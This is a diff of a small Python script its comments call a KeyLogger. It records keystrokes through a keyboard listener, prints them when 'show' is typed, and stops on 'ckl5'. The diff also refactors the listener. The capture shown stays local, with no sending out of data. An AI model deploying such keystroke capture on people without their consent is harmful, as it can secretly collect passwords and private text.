@@ -22,28 +22,31 @@ def on_press(key):
 ###     stop monitoring or show memory     ###
 def on_release(key):
     try:
-        show = input_keys[-1] == 'w' and input_keys[-2] == 'o' and input_keys[-3] == 'h' and input_keys[-4] == 's'
-        stop = input_keys[-1] == 'c' and input_keys[-2] == 'k'
+        show = input_keys[-4:] == ['s','h','o','w']
+        stop = input_keys[-4:] == ['c','k','l','5']
         if show:
         ###     enter 'show' to view the last memory keys       ###
             for i in range(4):
                 input_keys.pop()
             output_text = "".join(input_keys)
             print_text(output_text)
-            print_text(memory)
         ###     press "c + k" to stop monitoring       ###
         elif stop:
+            for i in range(4):
+                input_keys.pop()
             print_text('monitoring is stoped !')
             return False
+        else:
+            pass
     except:
         pass
 
 ###     keyboard listener      ###
-def listener():
-    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
-        listener.join()
-
+def run_listener():
+    listener = keyboard.Listener(on_press=on_press,on_release=on_release)
+    listener.start()
+    listener.join()
 
 ### run KeyLogger       ###
 if __name__ == '__main__':
-        listener()
+    run_listener()
